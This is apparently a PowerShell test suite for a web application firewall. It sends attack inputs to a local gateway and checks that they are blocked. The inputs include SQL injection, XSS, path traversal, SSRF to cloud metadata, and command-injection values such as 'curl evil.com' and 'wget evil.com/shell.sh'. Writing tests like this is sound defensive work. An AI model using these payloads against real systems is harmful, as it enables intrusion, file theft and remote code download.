###############################################################################
# NovaShield NGFW — Comprehensive Attack Test Suite
# Tests ALL security features against the running gateway on port 8090
###############################################################################

$GW = "http://127.0.0.1:8090"
$pass = 0
$fail = 0
$total = 0

function Test-Request {
    param(
        [string]$Name,
        [string]$Method = "GET",
        [string]$Url,
        [string]$Body = $null,
        [hashtable]$Headers = @{},
        [int]$ExpectedStatus,
        [string]$ExpectedContains = ""
    )

    $script:total++
    try {
        $params = @{
            Uri = $Url
            Method = $Method
            UseBasicParsing = $true
            ErrorAction = "Stop"
        }
        if ($Headers.Count -gt 0) {
            $params.Headers = $Headers
        }
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = "application/json"
        }

        $response = Invoke-WebRequest @params
        $status = $response.StatusCode
        $content = $response.Content
    }
    catch {
        $status = [int]$_.Exception.Response.StatusCode
        try {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $content = $reader.ReadToEnd()
            $reader.Close()
        } catch {
            $content = $_.Exception.Message
        }
    }

    $passed = ($status -eq $ExpectedStatus)
    if ($ExpectedContains -and $passed) {
        $passed = $content -like "*$ExpectedContains*"
    }

    if ($passed) {
        $script:pass++
        Write-Host "  [PASS] $Name  (HTTP $status)" -ForegroundColor Green
    } else {
        $script:fail++
        Write-Host "  [FAIL] $Name  (Expected $ExpectedStatus, Got $status)" -ForegroundColor Red
        Write-Host "         Response: $($content.Substring(0, [Math]::Min(200, $content.Length)))" -ForegroundColor DarkGray
    }

    return @{ Status = $status; Content = $content; Passed = $passed }
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  NovaShield NGFW — Full Attack Test Suite" -ForegroundColor Cyan
Write-Host "  Gateway: $GW" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[1] HEALTH CHECK" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Gateway health endpoint" `
    -Url "$GW/api/admin/health" -ExpectedStatus 200 -ExpectedContains "ok"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[2] NORMAL LOGIN FLOW" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

$loginResult = Test-Request -Name "Valid login (admin/password123)" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin","password":"password123"}' `
    -ExpectedStatus 200 -ExpectedContains "token"

$token = ""
if ($loginResult.Passed) {
    $parsed = $loginResult.Content | ConvertFrom-Json
    $token = $parsed.token
    Write-Host "         Token acquired: $($token.Substring(0,30))..." -ForegroundColor DarkGreen
}

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[3] JWT AUTHENTICATION TESTS" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Balance WITHOUT token -> 401" `
    -Url "$GW/api/balance" -ExpectedStatus 401 -ExpectedContains "UNAUTHORIZED"

Test-Request -Name "Balance WITH invalid token -> 401" `
    -Url "$GW/api/balance" `
    -Headers @{ Authorization = "Bearer fake.invalid.token" } `
    -ExpectedStatus 401 -ExpectedContains "UNAUTHORIZED"

if ($token) {
    Test-Request -Name "Balance WITH valid token -> 200" `
        -Url "$GW/api/balance" `
        -Headers @{ Authorization = "Bearer $token" } `
        -ExpectedStatus 200 -ExpectedContains "balance"
}

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[4] SQL INJECTION ATTACKS" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "SQLi: OR 1=1 in username" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin'' OR 1=1 --","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

Test-Request -Name "SQLi: UNION SELECT in body" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin UNION SELECT * FROM users","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

Test-Request -Name "SQLi: DROP TABLE in body" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin; DROP TABLE users","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

Test-Request -Name "SQLi: sleep() function" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin'' AND sleep(5)","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

Test-Request -Name "SQLi: comment -- with context" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin'' -- ","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[5] XSS ATTACKS" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "XSS: <script> in path query" `
    -Url "$GW/api/balance?q=<script>alert(1)</script>" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_XSS"

Test-Request -Name "XSS: onerror= in path" `
    -Url "$GW/api/balance?img=<img onerror=alert(1)>" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_XSS"

Test-Request -Name "XSS: javascript: in body" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"javascript:alert(1)","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_XSS"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[6] PATH TRAVERSAL ATTACKS" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Traversal: ../../etc/passwd" `
    -Url "$GW/api/balance?file=../../../../etc/passwd" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_TRAVERSAL"

Test-Request -Name "Traversal: boot.ini" `
    -Url "$GW/api/balance?file=C:\boot.ini" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_TRAVERSAL"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[7] COMMAND INJECTION ATTACKS (FIXED BUG)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "CmdInj: pipe to cat" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin | cat /etc/passwd","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_COMMAND"

Test-Request -Name "CmdInj: && curl (PREVIOUSLY BROKEN)" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin && curl evil.com","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_COMMAND"

Test-Request -Name "CmdInj: semicolon wget" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"admin; wget evil.com/shell.sh","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_COMMAND"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[8] URL ENCODING BYPASS (NEW FIX)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Encoded XSS: %3Cscript%3E" `
    -Url "$GW/api/balance?q=%3Cscript%3Ealert(1)%3C/script%3E" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_XSS"

Test-Request -Name "Encoded traversal: %2e%2e%2f" `
    -Url "$GW/api/balance?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_TRAVERSAL"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[9] HEADER INJECTION (NEW FIX)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "XSS in User-Agent header" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"testuser","password":"pass"}' `
    -Headers @{ "User-Agent" = "<script>alert('xss')</script>" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_XSS"

Test-Request -Name "SQLi in Referer header" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"testuser","password":"pass"}' `
    -Headers @{ "Referer" = "http://evil.com/' UNION SELECT * FROM users" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[10] NULL BYTE INJECTION (NEW RULE)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Null byte in path: %00" `
    -Url "$GW/api/balance?file=secret.txt%00.jpg" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_NULLBYTE"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[11] CRLF INJECTION (NEW RULE)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "CRLF injection: %0d%0a" `
    -Url "$GW/api/balance?header=%0d%0aInjected-Header:evil" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_CRLF"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[12] SSRF DETECTION (NEW RULE)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "SSRF: AWS metadata endpoint" `
    -Url "$GW/api/balance?url=http://169.254.169.254/latest/meta-data" `
    -Headers @{ Authorization = "Bearer $token" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_SSRF"

Test-Request -Name "SSRF: GCP metadata" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"http://metadata.google.internal/computeMetadata","password":"x"}' `
    -ExpectedStatus 403 -ExpectedContains "WAF_SSRF"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[13] IP BLACKLIST" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Blacklisted IP: 203.0.113.10" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"test","password":"test"}' `
    -Headers @{ "X-Real-IP" = "203.0.113.10" } `
    -ExpectedStatus 403 -ExpectedContains "BLOCKED_IP"

Test-Request -Name "Blacklisted IP: 198.51.100.20" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"test","password":"test"}' `
    -Headers @{ "X-Real-IP" = "198.51.100.20" } `
    -ExpectedStatus 403 -ExpectedContains "BLOCKED_IP"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[14] RATE LIMITING" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Write-Host "  Sending 7 rapid login requests from unique IP..." -ForegroundColor DarkGray
$rateLimitResults = @()
for ($i = 1; $i -le 7; $i++) {
    try {
        $r = Invoke-WebRequest -Uri "$GW/api/login" -Method POST `
            -Body '{"username":"ratelimiter","password":"test"}' `
            -ContentType "application/json" -UseBasicParsing `
            -Headers @{ "X-Real-IP" = "10.99.99.99" } -ErrorAction Stop
        $rateLimitResults += $r.StatusCode
    } catch {
        $rateLimitResults += [int]$_.Exception.Response.StatusCode
    }
}

$allowedCount = ($rateLimitResults | Where-Object { $_ -eq 200 }).Count
$blockedCount = ($rateLimitResults | Where-Object { $_ -eq 429 }).Count

$script:total++
if ($allowedCount -ge 4 -and $blockedCount -ge 1) {
    $script:pass++
    Write-Host "  [PASS] Rate limit: $allowedCount allowed, $blockedCount rate-limited (limit=5/min)" -ForegroundColor Green
} else {
    $script:fail++
    Write-Host "  [FAIL] Rate limit: $allowedCount allowed, $blockedCount rate-limited (expected ~5 allowed)" -ForegroundColor Red
    Write-Host "         Results: $($rateLimitResults -join ', ')" -ForegroundColor DarkGray
}

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[15] ADMIN RBAC" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

# Login as non-admin user
$customerLogin = $null
try {
    $r = Invoke-WebRequest -Uri "$GW/api/login" -Method POST `
        -Body '{"username":"customer1","password":"pass"}' `
        -ContentType "application/json" -UseBasicParsing -ErrorAction Stop `
        -Headers @{ "X-Real-IP" = "10.77.77.77" }
    $customerLogin = ($r.Content | ConvertFrom-Json).token
} catch {}

if ($customerLogin) {
    Test-Request -Name "Non-admin accessing /admin/snapshot -> 403" `
        -Url "$GW/api/admin/snapshot" `
        -Headers @{ Authorization = "Bearer $customerLogin"; "X-Real-IP" = "10.77.77.77" } `
        -ExpectedStatus 403 -ExpectedContains "FORBIDDEN"
}

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[16] ADMIN ENDPOINTS WITH WAF (NEW FIX)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Admin endpoint from blacklisted IP -> 403 BLOCKED" `
    -Url "$GW/api/admin/snapshot" `
    -Headers @{ Authorization = "Bearer $token"; "X-Real-IP" = "203.0.113.10" } `
    -ExpectedStatus 403 -ExpectedContains "BLOCKED_IP"

Test-Request -Name "Admin endpoint with SQLi in Referer header" `
    -Url "$GW/api/admin/logs" `
    -Headers @{ Authorization = "Bearer $token"; Referer = "http://x/' UNION SELECT * FROM admin" } `
    -ExpectedStatus 403 -ExpectedContains "WAF_SQLI"

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[17] VALID TRANSFER FLOW" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

if ($token) {
    Test-Request -Name "Valid transfer request" `
        -Method POST -Url "$GW/api/transfer" `
        -Body '{"to_account":"acct-bob","amount":100.50,"reference":"test-txn"}' `
        -Headers @{ Authorization = "Bearer $token" } `
        -ExpectedStatus 200 -ExpectedContains "transaction_id"
}

# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[18] FALSE POSITIVE CHECK (SHOULD NOT BLOCK)" -ForegroundColor Yellow
# ─────────────────────────────────────────────────────────────────────────────

Test-Request -Name "Normal login with hyphens in name (no false positive)" `
    -Method POST -Url "$GW/api/login" `
    -Body '{"username":"jean-pierre","password":"pass"}' `
    -Headers @{ "X-Real-IP" = "10.88.88.88" } `
    -ExpectedStatus 200

Test-Request -Name "Normal text with double-dash in reference (no false positive)" `
    -Method POST -Url "$GW/api/transfer" `
    -Body '{"to_account":"acct-bob","amount":10,"reference":"ref-2026-05-24"}' `
    -Headers @{ Authorization = "Bearer $token"; "X-Real-IP" = "10.88.88.89" } `
    -ExpectedStatus 200

# ─────────────────────────────────────────────────────────────────────────────
# RESULTS
# ─────────────────────────────────────────────────────────────────────────────

Write-Host "`n================================================================" -ForegroundColor Cyan
Write-Host "  RESULTS: $pass PASSED / $fail FAILED / $total TOTAL" -ForegroundColor $(if ($fail -eq 0) { "Green" } else { "Red" })
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
